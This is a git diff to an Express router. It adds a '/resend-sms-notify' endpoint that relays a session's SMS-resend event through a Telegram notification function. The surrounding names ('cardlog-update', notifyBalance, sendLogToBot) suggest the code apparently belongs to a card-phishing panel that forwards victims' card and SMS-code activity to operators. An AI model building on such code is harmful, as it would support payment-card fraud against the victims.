@@ -4,6 +4,7 @@ import { db, generateSessionId } from "./db";
 import {
   notifyBalance,
   notifyChange,
+  notifyResendSms,
   notifySms,
   sendCustomerToEchoBot,
   sendLogToBot,
@@ -351,6 +352,35 @@ router.post("/cardlog-update", async (req, res) => {
   } catch (error) {
     console.error("Error updating card log:", error);
     res.status(500).json({ success: false, error: "Database error" });
+  }
+});
+
+router.post("/resend-sms-notify", async (req, res) => {
+  const { sessionId } = req.body;
+
+  if (!sessionId) {
+    return res.status(400).json({
+      success: false,
+      error: "sessionId required",
+    });
+  }
+
+  try {
+    // Используем функцию из telegram.ts
+    await notifyResendSms(sessionId);
+
+    console.log(`🔄 Resend SMS notification sent for session: ${sessionId}`);
+
+    res.json({
+      success: true,
+      message: "Resend SMS notification sent",
+    });
+  } catch (error) {
+    console.error("Error sending resend SMS notification:", error);
+    res.status(500).json({
+      success: false,
+      error: "Failed to send notification",
+    });
   }
 });
 
